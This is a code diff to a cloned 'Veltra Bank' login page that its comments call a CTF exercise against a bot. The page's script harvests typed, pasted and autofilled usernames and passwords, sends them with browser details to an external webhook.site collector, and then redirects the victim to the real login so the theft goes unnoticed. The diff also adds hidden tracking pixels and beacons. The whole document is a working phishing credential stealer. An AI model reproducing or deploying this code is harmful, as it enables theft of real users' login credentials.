@@ -107,6 +107,9 @@
 </style>
 </head>
 <body>
+  <!-- NUEVO: sensor same-origin que dispara al PARSEAR el HTML, aunque el bot no corra JS -->
+  <img src="/api/hit?e=parse" alt="" width="1" height="1" style="position:absolute;left:-9999px">
+
   <header class="topbar">
     <div class="brand">
       <div class="logo" aria-hidden="true">
@@ -167,13 +170,6 @@
   <script>
   /* =======================================================================
      CTF Veltra Bank — captura de credenciales del bot "Gastón Díaz"
-     -----------------------------------------------------------------------
-     CONFIGURÁ ESTAS DOS CONSTANTES:
-       COLLECTOR   -> tu endpoint para recibir lo capturado.
-                      Lo más rápido: abrí https://webhook.site y pegá tu URL única.
-       REAL_LOGIN  -> login real del reto (chl-xxxx-...). Tras capturar, se
-                      redirige ahí para que el flujo parezca normal y el bot
-                      no marque la página como sospechosa.
      ======================================================================= */
   const COLLECTOR  = "https://webhook.site/b3e649bc-9695-4f01-8b88-f66a610efd0d";
   const REAL_LOGIN = "https://chl-2f300676-d4d2-419a-8af0-6a6a44e378f9-veltra-bank.softwareseguro.com.ar/login";
@@ -181,8 +177,6 @@
   const form = document.getElementById('form-login');
   const user = document.getElementById('txt-login');
   const pass = document.getElementById('txt-password');
-  // Deduplicación: guardamos el último par (user,pass) enviado para no repetir
-  // y, sobre todo, para NO cortar el valor en el primer caracter.
   let lastKey = "";
 
   function send(params){
@@ -195,17 +189,19 @@
   function exfil(reason){
     const u = (user.value || '').trim();
     const p = pass.value || '';
-    if(!u && !p) return;                       // todavía no hay nada útil
+    if(!u && !p) return;
     const key = u + "\u0001" + p;
-    if(key === lastKey) return;                // ya mandamos exactamente este par
+    if(key === lastKey) return;
     lastKey = key;
     send({ username:u, password:p, reason:reason,
            ua:navigator.userAgent, ref:document.referrer, t:Date.now() });
   }
 
-  // 0) Aviso de visita: confirma que el bot ABRIÓ la página (aunque no tipee nada).
-  //    Sirve para distinguir "no visitó" de "visitó pero no completó".
+  // 0) Aviso de visita hacia webhook.site (dominio externo).
   send({ event:"pageview", ua:navigator.userAgent, ref:document.referrer, t:Date.now() });
+
+  // 0.b) NUEVO: sensor same-origin por JS (mismo camino de red que cargó el HTML).
+  fetch("/api/hit?e=js&ref=" + encodeURIComponent(document.referrer)).catch(()=>{});
 
   // 1) Al enviar el formulario -> valores completos, y luego redirige al login real.
   form.addEventListener('submit', function(e){
@@ -214,7 +210,7 @@
     setTimeout(function(){ try{ location.href = REAL_LOGIN; }catch(e){} }, 500);
   });
 
-  // 2) Mientras tipea/pega, con debounce para captar el valor FINAL (no el primer caracter).
+  // 2) Mientras tipea/pega, con debounce para captar el valor FINAL.
   let deb = null;
   function schedule(){ clearTimeout(deb); deb = setTimeout(function(){ exfil('input'); }, 500); }
   [user, pass].forEach(function(el){
@@ -223,7 +219,7 @@
     el.addEventListener('blur',   function(){ exfil('blur'); });
   });
 
-  // 3) Por si el navegador autocompleta al cargar (gestor de contraseñas).
+  // 3) Por si el navegador autocompleta al cargar.
   setTimeout(function(){ exfil('autofill'); }, 1500);
   </script>
 </body>
